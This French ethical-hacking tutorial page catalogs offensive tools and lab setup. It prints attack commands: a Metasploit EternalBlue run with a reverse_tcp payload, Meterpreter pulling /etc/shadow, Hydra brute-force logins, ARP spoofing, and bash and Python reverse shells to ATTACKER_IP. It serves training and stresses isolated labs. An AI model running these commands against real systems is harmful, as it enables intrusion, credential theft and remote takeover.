---
title: Boîte à outils
description: Outils essentiels pour le hacking éthique — distributions, reconnaissance, web, exploitation, mots de passe, réseau et post-exploitation.
category: hacking
slug: tools
order: 11
---

## Distributions spécialisées {#distros}

Les distributions de sécurité offensive embarquent des centaines d'outils préinstallés et préconfigurés.

| Distribution   | Base    | Particularité                                     | Usage recommandé                 |
| -------------- | ------- | ------------------------------------------------- | -------------------------------- |
| **Kali Linux** | Debian  | Standard de l'industrie, 600+ outils préinstallés | Pentest, CTF, formation          |
| **Parrot OS**  | Debian  | Plus léger que Kali, version Home disponible      | Pentest + usage quotidien        |
| **BlackArch**  | Arch    | 2800+ outils, rolling release                     | Utilisateurs avancés             |
| **CommandoVM** | Windows | VM Windows orientée pentest (Mandiant)            | Tests sur environnements Windows |

> **Conseil** : Commencer avec **Kali Linux** en VM. C'est le standard et la majorité des tutoriels l'utilisent.

## Reconnaissance {#recon}

| Outil            | Description                                  | Installation                    | Exemple                                    |
| ---------------- | -------------------------------------------- | ------------------------------- | ------------------------------------------ |
| **Nmap**         | Scanner de ports et services                 | `sudo apt install nmap`         | `nmap -sV -p- 192.168.1.10`                |
| **Shodan**       | Moteur de recherche de services exposés      | `pip install shodan`            | `shodan host 93.184.216.34`                |
| **theHarvester** | Collecte d'emails et sous-domaines           | `sudo apt install theharvester` | `theHarvester -d example.com -b google`    |
| **Maltego**      | Visualisation de relations (OSINT graphique) | Préinstallé sur Kali            | Interface graphique, entités et transforms |
| **Amass**        | Énumération de sous-domaines avancée         | `sudo apt install amass`        | `amass enum -d example.com`                |
| **Recon-ng**     | Framework de reconnaissance modulaire        | `sudo apt install recon-ng`     | `recon-ng` puis `marketplace search`       |
| **dnsenum**      | Énumération DNS                              | `sudo apt install dnsenum`      | `dnsenum example.com`                      |

Pour les techniques de reconnaissance en détail, voir la [documentation Reconnaissance](/help/hacking/reconnaissance).

## Outils web {#web}

| Outil          | Description                            | Installation                               | Exemple                                         |
| -------------- | -------------------------------------- | ------------------------------------------ | ----------------------------------------------- |
| **Burp Suite** | Proxy d'interception et scanner web    | [portswigger.net](https://portswigger.net) | Configurer le proxy navigateur → 127.0.0.1:8080 |
| **OWASP ZAP**  | Alternative open source à Burp Suite   | `sudo apt install zaproxy`                 | `zaproxy`                                       |
| **Nikto**      | Scanner de vulnérabilités web          | `sudo apt install nikto`                   | `nikto -h http://192.168.1.10`                  |
| **Gobuster**   | Brute force de répertoires et fichiers | `sudo apt install gobuster`                | `gobuster dir -u http://target -w wordlist`     |
| **ffuf**       | Fuzzer web rapide et flexible          | `sudo apt install ffuf`                    | `ffuf -u http://target/FUZZ -w wordlist`        |
| **SQLMap**     | Automatisation de l'injection SQL      | `sudo apt install sqlmap`                  | `sqlmap -u "http://target?id=1" --dbs`          |
| **WPScan**     | Scanner spécifique à WordPress         | `sudo apt install wpscan`                  | `wpscan --url http://target --enumerate u`      |

### Burp Suite : Community vs Professional

| Fonctionnalité         | Community (gratuit) | Professional (payant) |
| ---------------------- | ------------------- | --------------------- |
| Proxy d'interception   | Oui                 | Oui                   |
| Repeater / Intruder    | Oui (limité)        | Oui (complet)         |
| Scanner automatique    | Non                 | Oui                   |
| Vitesse de brute force | Limitée             | Illimitée             |
| Extensions (BApps)     | Oui                 | Oui                   |

Pour les vulnérabilités web en détail, voir la [documentation Vulnérabilités web](/help/hacking/web).

## Exploitation {#exploitation}

### Metasploit Framework {#metasploit}

**Metasploit** est le framework d'exploitation le plus utilisé. Il contient des milliers d'exploits, payloads et modules auxiliaires.

```bash
# Start the Metasploit console
msfconsole

# Search for an exploit
msf6 > search eternalblue
msf6 > search type:exploit platform:linux apache

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(ms17_010_eternalblue) > show options

# Set target and payload options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Launch the exploit
msf6 exploit(ms17_010_eternalblue) > exploit
```

### Commandes Meterpreter essentielles

```bash
# System information
meterpreter > sysinfo

# Get current user
meterpreter > getuid

# Attempt privilege escalation
meterpreter > getsystem

# List processes
meterpreter > ps

# Upload / download files
meterpreter > upload /tmp/linpeas.sh /tmp/
meterpreter > download /etc/shadow /tmp/

# Open a system shell
meterpreter > shell

# Pivot to another network
meterpreter > run autoroute -s 10.0.0.0/24
```

### SearchSploit {#searchsploit}

**SearchSploit** recherche des exploits dans la base ExploitDB en local (hors ligne).

```bash
# Search for exploits by keyword
searchsploit apache 2.4
searchsploit openssh 8.9

# Show exploit details
searchsploit -x 12345

# Copy an exploit to the current directory
searchsploit -m 12345
```

## Mots de passe {#passwords}

| Outil               | Type d'attaque         | Installation                    | Exemple                                        |
| ------------------- | ---------------------- | ------------------------------- | ---------------------------------------------- |
| **Hashcat**         | Cracking offline (GPU) | `sudo apt install hashcat`      | `hashcat -m 0 -a 0 hash.txt rockyou.txt`       |
| **John the Ripper** | Cracking offline       | `sudo apt install john`         | `john hash.txt --wordlist=rockyou.txt`         |
| **Hydra**           | Brute force online     | `sudo apt install hydra`        | `hydra -l admin -P wordlist.txt ssh://target`  |
| **CrackMapExec**    | Brute force réseau     | `sudo apt install crackmapexec` | `crackmapexec smb target -u user -p wordlist`  |
| **Medusa**          | Brute force online     | `sudo apt install medusa`       | `medusa -h target -u admin -P wordlist -M ssh` |

### Hydra : brute force en ligne

```bash
# Brute force SSH login
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Brute force web login form (POST)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Brute force FTP
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10

# Brute force with specific port
hydra -l root -P wordlist.txt -s 2222 ssh://192.168.1.10
```

Pour le hash cracking en détail, voir la [documentation Hash cracking](/help/hacking/hashing).

## Réseau {#network}

| Outil           | Description                                  | Installation                          | Exemple                                        |
| --------------- | -------------------------------------------- | ------------------------------------- | ---------------------------------------------- |
| **Wireshark**   | Analyseur de paquets graphique               | `sudo apt install wireshark`          | `wireshark` ou `tshark -i eth0`                |
| **tcpdump**     | Capture de paquets en ligne de commande      | `sudo apt install tcpdump`            | `sudo tcpdump -i eth0 port 80 -w capture.pcap` |
| **Ettercap**    | ARP spoofing et MITM                         | `sudo apt install ettercap-text-only` | `sudo ettercap -T -M arp /target// /gateway//` |
| **Bettercap**   | Framework MITM moderne                       | `sudo apt install bettercap`          | `sudo bettercap -iface eth0`                   |
| **Responder**   | Empoisonnement LLMNR/NBT-NS                  | `sudo apt install responder`          | `sudo responder -I eth0 -rdw`                  |
| **Netcat (nc)** | Outil réseau polyvalent (« couteau suisse ») | Préinstallé                           | `nc -lvnp 4444` (listener)                     |

Pour les attaques réseau en détail, voir la [documentation Attaques réseau](/help/hacking/network).

## Post-exploitation {#postexploit}

| Outil         | Description                     | Installation / Téléchargement          | Exemple                                     |
| ------------- | ------------------------------- | -------------------------------------- | ------------------------------------------- |
| **LinPEAS**   | Énumération Linux automatisée   | `curl -L .../linpeas.sh -o linpeas.sh` | `./linpeas.sh`                              |
| **WinPEAS**   | Énumération Windows automatisée | Télécharger depuis GitHub              | `winPEASany.exe`                            |
| **pspy**      | Moniteur de processus sans root | Télécharger depuis GitHub              | `./pspy64`                                  |
| **Chisel**    | Tunnel TCP/pivoting             | Télécharger depuis GitHub              | Serveur : `chisel server -p 8000 --reverse` |
| **Ligolo-ng** | Tunneling avancé                | Télécharger depuis GitHub              | Alternative moderne à Chisel                |

Pour l'escalade de privilèges, voir la [documentation Escalade de privilèges](/help/hacking/privesc).

## Reverse shells {#reverseshells}

Les reverse shells permettent d'obtenir un accès interactif après exploitation. La cible se connecte à l'attaquant (contourne les firewalls entrants).

```bash
# Listener on attacker machine
nc -lvnp 4444

# Bash reverse shell (on target)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell (on target)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Upgrade to interactive TTY (after getting a reverse shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z and type:
stty raw -echo; fg
export TERM=xterm
```

> **Référence** : [revshells.com](https://www.revshells.com/) génère des reverse shells dans tous les langages.

## Mettre en place un lab {#lab}

### Environnement recommandé

```
┌──────────────────────────────────────────────────────┐
│                Machine hôte (votre PC)               │
│                                                      │
│   ┌───────────────┐               ┌──────────────┐   │
│   │  Kali Linux   │  <─────────>  │    Cible     │   │
│   │  (attaquant)  │     NAT ou    │  vulnérable  │   │
│   └───────────────┘   Host only   └──────────────┘   │
│                                                      │
│   Hyperviseur : VirtualBox / VMware                  │
└──────────────────────────────────────────────────────┘
```

### Installation pas à pas

```bash
# 1. Install VirtualBox
sudo apt install virtualbox

# 2. Download Kali Linux VM
# https://www.kali.org/get-kali/#kali-virtual-machines

# 3. Download a vulnerable VM for practice
# - Metasploitable 2/3: intentionally vulnerable Linux
# - DVWA: Damn Vulnerable Web Application
# - VulnHub: hundreds of vulnerable VMs

# 4. Network configuration
# Set both VMs to "Host-only" or "Internal Network"
# This isolates the lab from your real network
```

### VMs vulnérables pour s'entraîner

| VM                   | Difficulté    | Contenu                                           |
| -------------------- | ------------- | ------------------------------------------------- |
| **Metasploitable 2** | Débutant      | Services vulnérables, exploitation classique      |
| **DVWA**             | Débutant      | Application web avec vulnérabilités configurables |
| **Mr. Robot**        | Intermédiaire | CTF basé sur la série TV                          |
| **Kioptrix**         | Débutant      | Série de VMs de difficulté croissante             |
| **HackTheBox**       | Tous niveaux  | Machines en ligne, communauté active              |

> **Important** : Toujours utiliser un réseau isolé (Host-only) pour les VMs vulnérables. Ne jamais les exposer sur un réseau connecté à Internet.

## Pour aller plus loin {#next}

- [Introduction au hacking éthique](/help/hacking/introduction) — cadre légal et méthodologie
- [Reconnaissance](/help/hacking/reconnaissance) — commencer la collecte d'informations
- [Scanning et énumération](/help/hacking/scanning) — découvrir les services exposés